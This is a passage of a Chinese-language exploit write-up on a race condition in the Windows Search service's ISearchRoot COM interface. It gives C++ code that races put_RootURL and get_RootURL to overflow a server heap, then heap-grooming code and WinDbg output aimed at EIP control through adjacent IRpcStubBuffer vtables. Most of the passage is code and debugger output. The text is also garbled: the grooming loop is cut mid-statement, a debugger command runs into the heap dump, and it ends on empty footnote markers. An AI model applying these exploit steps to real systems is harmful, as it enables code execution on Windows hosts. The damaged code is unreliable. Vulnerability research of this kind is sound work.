        // Free COM resource, End
        pISearchRoot->Release();
        CoUninitialize();
    }
在此之后，触发漏洞的过程非常简单。我们创建了两个线程：一个线程将不同长度的数据写入共享缓冲区，另一个线程在与此同时从共享缓冲区中读取数据。
    DWORD __stdcall thread_putter(LPVOID param)
    {
        ISearchManager *pSearchManager = (ISearchManager*)param;
        while (1) {
            pSearchManager->put_RootURL(L"AA");
            pSearchManager->put_RootURL(L"AAAAAAAAAA");
        }
        return 0;
    }
    DWORD __stdcall thread_getter(LPVOID param)
    {
        ISearchRoot *pISearchRoot = (ISearchRoot*)param;
        PWSTR get_pszUrl;
        while (1) {
            pISearchRoot->get_RootURL(&get_pszUrl);
        }
        return 0;
    }
由此就导致了崩溃。
毫无疑问，在StringCchCopyW函数复制RootURL数据之前，竞争条件就已经成功，并且导致堆溢出。
## EIP控制
为了控制EIP，我们需要为存在漏洞的服务器堆创建一个对象。
我们编写了如下的客户端代码，以跟踪堆的状态。
    int wmain(int argc, wchar_t *argv[])
    {
        CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE);
        ISearchRoot *pISearchRoot[20];
        for (int i = 0; i Release();
        pISearchRoot[5]->Release();
        pISearchRoot[7]->Release();
        pISearchRoot[9]->Release();
        pISearchRoot[11]->Release();
        CreateThread(NULL, 0, thread_putter, (LPVOID)pISearchRoot[13], 0, NULL);
        CreateThread(NULL, 0, thread_getter, (LPVOID)pISearchRoot[13], 0, NULL);
        Sleep(500);
        CoUninitialize();
        return 0;
    }
由此发现，如果客户端不释放pISearchRoot对象，那么IRpcStubBuffer对象将会保留在服务器堆上。并且，我们还发现，IRpcStubBuffer对象位于漏洞所在堆的位置附近。
        0:010> !heap -p -all
        ...
        03d58f10 0005 0005  [00]   03d58f18    0001a - (busy)      (mssprxy+0x75)
        03d58f38 0005 0005  [00]   03d58f40    00020 - (free)
        03d58f60 0005 0005  [00]   03d58f68    0001c - (busy)      dds poi(03d58f18) l10
        71215bc8  7121707e mssprxy!CStdStubBuffer_QueryInterface
        71215bcc  71217073 mssprxy!CStdStubBuffer_AddRef
        71215bd0  71216840 mssprxy!CStdStubBuffer_Release
        71215bd4  71217926 mssprxy!CStdStubBuffer_Connect
        71215bd8  71216866 mssprxy!CStdStubBuffer_Disconnect   
[2]   
[3]   
[4]   
[5]   
[6] 